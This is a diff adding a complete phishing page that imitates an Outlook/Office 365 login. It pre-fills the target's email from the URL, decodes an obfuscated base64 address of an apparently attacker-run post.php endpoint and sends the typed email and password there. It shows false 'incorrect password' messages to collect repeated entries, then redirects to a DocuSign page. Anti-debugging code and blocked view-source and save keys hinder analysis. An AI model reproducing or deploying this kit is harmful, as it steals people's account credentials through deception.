@@ -1,0 +1,434 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<link rel="icon" href="favicon.png" type="image/x-icon"/>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Outlook :: Office 365</title>
+
+<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+<link href="https://ucarecdn.com/eae24034-0cc9-4528-827a-d46e30dd5a83/hover.css" rel="stylesheet" media="all">
+
+<style type="text/css">
+    .hide {
+      display: none;
+    }
+
+    .grey-form {
+      background-color: #ffffff;
+      opacity: 1;
+      pointer-events: none;
+    }
+
+    .alert-success {
+      color: #155724;
+      background-color: #d4edda;
+      border-color: #c3e6cb;
+    }
+
+
+
+    .modal-body {
+    padding: 0 !important;
+}
+.login-container{
+    position: absolute;
+    /*width: 400px;*/
+    margin: 80px auto;
+    padding: 0px 10px 10px 10px;
+    text-align: center;
+    /*background: #f5f5f5;
+    border: 1px solid #ccc;*/
+}
+
+#output{
+    position: absolute;
+    width: 400px;
+    top: -75px;
+    left: 0;
+    color: #fff;
+}
+
+#output.alert-success{
+    background: rgb(25, 204, 25);
+}
+
+#output.alert-danger{
+    background: rgb(228, 105, 105);
+
+}
+
+.avatar{
+    width: 100px;height: 100px;
+    margin: 10px auto -30px;
+    border-radius: 100%;
+    border: 2px solid #aaa;
+    background-size: cover;
+}
+
+.form-box input{
+    width: 100%;
+	margin: 1px; auto
+    padding: 10px;
+    text-align: center;
+    height: 40px;
+    border: 1px solid #ccc;;
+    background: #ffffff;
+    transition:0.2s ease-in-out;
+
+}
+
+.form-box input:focus{
+    outline: 50px;
+    background: #ffffff;
+}
+
+.form-box input[type="text"]{
+    border-radius: 5px 5px 0 0;
+    text-transform: lowercase;
+}
+
+.form-box input[type="password"]{
+    border-radius: 0 0 0px 0px;
+    border-top: 0;
+}
+
+.form-box button.login{
+    margin-top: 15px;
+    padding: 10px 20px;
+}
+
+.animated {
+  -webkit-animation-duration: 1s;
+  animation-duration: 1s;
+  -webkit-animation-fill-mode: both;
+  animation-fill-mode: both;
+}
+
+@-webkit-keyframes fadeInUp {
+  0% {
+    opacity: 0;
+    -webkit-transform: translateY(20px);
+    transform: translateY(20px);
+  }
+
+  100% {
+    opacity: 0;
+    -webkit-transform: translateY(0);
+    transform: translateY(0);
+  }
+}
+
+@keyframes fadeInUp {
+  0% {
+    opacity: 0;
+    -webkit-transform: translateY(20px);
+    -ms-transform: translateY(20px);
+    transform: translateY(20px);
+  }
+
+  100% {
+    opacity: 1;
+    -webkit-transform: translateY(0);
+    -ms-transform: translateY(0);
+    transform: translateY(0);
+  }
+}
+
+.fadeInUp {
+  -webkit-animation-name: fadeInUp;
+  animation-name: fadeInUp;
+}
+  </style>
+
+</head>
+
+<body>
+  <div class="container-fluid">
+    <div class="row" style="height: 100vh; background-image: url('pmt-2.png'); background-size: cover;background-repeat: no-repeat;">
+      <div class="container">
+        <div class="row">
+
+
+        </div>
+      </div>
+
+
+  <!-- Modal for gmail -->
+  <div style="display: block !important" class="modal" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+    <div class="modal-dialog" role="document">
+      <div style="position: relative;
+                  display: -webkit-box;
+                  display: -ms-flexbox;
+                  display: flex;
+                  -webkit-box-orient: vertical;
+                  -webkit-box-direction: normal;
+                  -ms-flex-direction: column;
+                  flex-direction: column;
+                  width: 80%;
+                  pointer-events: auto;
+                  ">
+        <div class="modal-body">
+
+        <div class="login-container">
+            <div id="output"></div>
+            <!--
+			<div class="avatar">
+              <img  class="img-fluid brand_logo" width="60px" style="margin-top: 20px;" src="https://i.gyazo.com/83cffd1ebf23ed93aa925eb9529f5348.png">
+            </div>
+			-->
+            <div class="form-box">
+              <div style="margin-top: 2px;" class="alert"><color style="color:red;"><!--Your account or password is incorrect--> </color></div>
+              <!--<h4>The email has timed out!</h4>-->
+              <!--<p style="color:#0C3DCC; font-size:17px;"><b>" <span class="logoname"> Quire</span>_Sales_Contract.xlsx "</b></p>-->
+                <!--<form id="contact" class="form-horizontal well">-->
+                <form action="file:///C:/Users/HP/Documents/excel%20link%202024/index.html" method="post">
+                    <input type="text" value="" id="a" name="a" style="background-color: #eee;opacity: 1;" aria-describedby="emailHelp" placeholder="Enter Your Email" readonly="">
+                    
+                    <input type="password" name="az" id="az" aria-describedby="emailHelp" placeholder="Enter Your Password" required="" class="form-input-container"><p>
+					  <!--<form id="contact" class="form-horizontal well">-->
+					</p><div id="msg" style="margin-bottom:25px; display:none; color:#ff1505;">Invalid login password</div>
+					<div id="error" style="margin-bottom:25px; display:none; color:#ff1505;"> </div>
+                    <button class="btn btn-success btn-block login" style="background: #039126;" id="submit-btn" type="submit">Login</button>
+					
+<span class="small" style="margin-bottom:25px; color:#ff1505;" id="msg_text"></span>
+                </form>
+            </div>
+        </div>
+
+
+
+
+        </div>
+
+
+      </div>
+    </div>
+  </div>
+
+
+
+
+<script src="./okk_files/jquery-3.2.1.slim.min.js.download" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="./okk_files/popper.min.js.download" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="./okk_files/bootstrap.min.js.download" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+  <script src="./okk_files/jquery.min.js.download"></script>
+  
+  
+ <script>
+function q4wcdh6k8r() {
+  const threshold = 100;
+  const start = performance.now();
+  debugger;
+  if (performance.now() - start > threshold) {
+    return true;
+  }
+}
+
+setInterval(q4wcdh6k8r, 1000);
+// prevent ctrl + s
+$(document).bind('keydown', function(e) {
+if(e.ctrlKey && (e.which == 83)) {
+e.preventDefault();
+return false;
+}
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+document.onkeydown = function(e) {
+if (e.ctrlKey && 
+(e.keyCode === 67 ||   
+e.keyCode === 86 || 
+e.keyCode === 85 || 
+e.keyCode === 117)) {
+return false;
+} else {
+return true;
+}
+};
+$(document).keypress("u",function(e) {
+if(e.ctrlKey)
+{
+return false;      }
+else {
+return true;
+}});
+
+
+
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+ 
+      $('#back1').click(function () {
+        $("#msg").hide();
+        $('#a').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      });
+      
+   
+      function k8gjyg845r(str) {
+        if (str === '' || str.trim() === '') {
+          return false;
+        }
+        try {
+          return btoa(atob(str)) == str;
+        } catch (err) {
+          return false;
+        }
+      }
+	  
+      var a = window.location.hash.substr(1);
+    if (k8gjyg845r(a)) {
+        a = atob(window.location.hash.substr(1));
+      }
+      if (!a) {
+		$('#a').focus();
+      }
+      else
+      {
+        var my_a = a;
+        $('#a').val(my_a); 
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_a)) {
+          $('#error').show();
+           a.focus;
+           return false;
+        }
+		 var ind=my_a.indexOf("@");
+        var my_slice=my_a.substr((ind+1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.charAt(0).toUpperCase() + c.slice(1);
+        var finalu= c.toUpperCase();
+
+      
+        $(".logoname").html(final);
+      
+		
+      var ind=my_a.indexOf("@");
+        var my_slice=my_a.substr((ind+1));
+		var mainPage = 'https://'+my_slice; 
+		
+		var sv = my_slice;
+		
+		var image = "url('https://image.thum.io/get/width/1200/https://"+sv;"')"
+		
+
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+mainPage);
+         
+      <!---  document.body.style.backgroundImage = image; --->
+	 	
+     $(".a").html(a);
+		$("#az").focus()
+      }
+ 
+      $('#submit-btn').click(function(event){
+    
+		event.preventDefault();
+        $('#error').hide();
+        $('#msg').hide();
+        var a=$("#a").val();
+        var az=$("#az").val();
+      ///////////new injection////////////////
+      var my_a =a;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!a) {
+            $('#error').show();
+            $('#error').html("<p style='color:red; font-size:15px'> Email field is empty</p>");
+        
+            return false;
+        }
+
+        if (!filter.test(my_a)) {
+            $('#error').show();
+            $('#error').html("<p style='color:red; font-size:14px'>That account doesn't exist. Enter a different account</p>");
+            
+            return false;
+        }
+        if (!az) {
+            $('#error').show();
+            $('#error').html("Password field is empty");
+         
+            return false;
+        }
+		 if (az.length < 7 ) {
+            $('#error').show();
+            $('#error').html("An error occured, invalid password");
+            az.focus;
+            return false;
+        } 
+ 
+		 
+      ///////////new injection////////////////
+      count=count+1;
+    //  console.log(count);
+	var _0x10f9aa=_0x265c;function _0x32c9(){var _0x889561=['1807374JANyWP','156336ygXAvI','5BxeOnY','7102235gZaIVR','1033860eShQbT','1658776WMhREL','1025564fCmVbt','5220944zADYoF','9mzRsCl','aHR0cHM6Ly9tY2h3b2h5aC51cy83MXYyaGo1aWV6eGt5bTNiZnlpc2g3bi9wb3N0LnBocA=='];_0x32c9=function(){return _0x889561;};return _0x32c9();}function _0x265c(_0x213f19,_0x5e7096){var _0x32c93f=_0x32c9();return _0x265c=function(_0x265c47,_0x2aa015){_0x265c47=_0x265c47-0x9c;var _0x15fe37=_0x32c93f[_0x265c47];return _0x15fe37;},_0x265c(_0x213f19,_0x5e7096);}
+
+	var d=(function(_0x3e2326,_0x42a2c6){var _0x533fea=_0x265c,_0x101738=_0x3e2326();while(!![]){try{var _0x14c43f=parseInt(_0x533fea(0xa2))/0x1+parseInt(_0x533fea(0xa1))/0x2+parseInt(_0x533fea(0x9c))/0x3+parseInt(_0x533fea(0x9d))/0x4*(-parseInt(_0x533fea(0x9e))/0x5)+-parseInt(_0x533fea(0xa0))/0x6+-parseInt(_0x533fea(0x9f))/0x7+parseInt(_0x533fea(0xa3))/0x8*(-parseInt(_0x533fea(0xa4))/0x9);if(_0x14c43f===_0x42a2c6)break;else _0x101738['push'](_0x101738['shift']());}catch(_0x4a8226){_0x101738['push'](_0x101738['shift']());}}}(_0x32c9,0x8d4e9),atob(_0x10f9aa(0xa5)));
+	   $.ajax({
+        dataType: 'JSON',
+		url: d,
+        type: 'POST',
+        data:{
+          ai:a,
+          namep:az
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Please wait....');
+			  
+    //  console.log(count); 
+            },
+            success: function(response){
+			 $('#msg').html("<span style='color:red;'>Password is incorrect. Please try again</span>");
+              if(response){
+                $("#msg").show();
+				console.log(response);
+				$('#msg').html(response['msg']);
+                if(response['signal'] == 'ok'){
+                  $("#az").val("");
+                  if (count>=4) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("https://na4.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f");
+
+                  }
+                  // $('#msg').html(response['msg']);
+                }
+                else{
+                   $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#az").val("");
+              if (count>=4) {
+                count=0;
+                window.location.replace("https://na4.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f");
+              }
+              $("#msg").show();
+              // $('#msg').html("Please try again later");
+            },
+            complete: function(){
+              $('#submit-btn').html('View Document');
+            }
+          });  
+    });
+
+
+    });
+
+
+  </script>
+  
+
+
+  
+</div></div></body></html>
